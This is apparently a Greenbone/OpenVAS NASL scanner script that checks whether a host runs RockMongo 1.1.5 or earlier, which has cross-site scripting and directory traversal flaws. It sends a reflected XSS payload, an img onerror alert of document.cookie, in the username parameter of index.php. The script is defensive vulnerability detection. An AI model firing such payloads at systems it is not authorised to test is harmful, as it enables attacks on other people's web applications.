CPE = "cpe:/a:rockmongo:rockmongo";
if(description){
	script_oid( "1.3.6.1.4.1.25623.1.0.804176" );
	script_version( "$Revision: 11401 $" );
	script_cve_id( "CVE-2013-5108", "CVE-2013-5107" );
	script_bugtraq_id( 63969, 63975 );
	script_tag( name: "cvss_base", value: "5.0" );
	script_tag( name: "cvss_base_vector", value: "AV:N/AC:L/Au:N/C:P/I:N/A:N" );
	script_tag( name: "last_modification", value: "$Date: 2018-09-15 10:45:50 +0200 (Sat, 15 Sep 2018) $" );
	script_tag( name: "creation_date", value: "2013-12-24 09:13:23 +0530 (Tue, 24 Dec 2013)" );
	script_name( "RockMongo Cross Site Scripting and Directory Traversal Vulnerabilities" );
	script_tag( name: "impact", value: "Successful exploitation will allow remote attackers to gain access to
  arbitrary sensitive files and execute arbitrary script code in a user's browser
  within the trust relationship between the browser and the server." );
	script_tag( name: "affected", value: "Rockmongo versions 1.1.5 and prior." );
	script_tag( name: "insight", value: "The flaws are due to

  - An improper validation of user-supplied input in 'xn' function via 'db'
  and 'username' parameters to 'index.php' script.

  - An improper validation of user-supplied input via other unspecified parameters.

  - An improper sanitizing user input via 'ROCK_LANG' cookie to 'index.php' script." );
	script_tag( name: "solution", value: "Vendor fixes are available." );
	script_tag( name: "solution_type", value: "VendorFix" );
	script_tag( name: "vuldetect", value: "Send a crafted data via HTTP GET request and check whether it is vulnerable
  or not." );
	script_tag( name: "summary", value: "This host is installed with Rockmongo and is prone to cross site scripting
  and directory traversal vulnerabilities." );
	script_xref( name: "URL", value: "http://xforce.iss.net/xforce/xfdb/89366" );
	script_xref( name: "URL", value: "https://www.trustwave.com/spiderlabs/advisories/TWSL2013-026.txt" );
	script_category( ACT_ATTACK );
	script_copyright( "Copyright (C) 2013 Greenbone Networks GmbH" );
	script_family( "Web application abuses" );
	script_dependencies( "sw_rockmongo_detect.sc" );
	script_require_ports( "Services/www", 80 );
	script_mandatory_keys( "rockmongo/installed" );
	script_tag( name: "qod_type", value: "remote_app" );
	exit( 0 );
}
require("http_func.inc.sc");
require("http_keepalive.inc.sc");
require("host_details.inc.sc");
if(!port = get_app_port( cpe: CPE )){
	exit( 0 );
}
if(!dir = get_app_location( cpe: CPE, port: port )){
	exit( 0 );
}
if(dir == "/"){
	dir = "";
}
url = dir + "/index.php?action=login.index&host=0&username=\"><img+src%3D1" + "+onerror%3Dalert(document.cookie)>";
if(http_vuln_check( port: port, url: url, check_header: TRUE, pattern: "onerror=alert\\(document.cookie\\)>", extra_check: ">RockMongo<" )){
	security_message( port: port );
	exit( 0 );
}
exit( 99 );

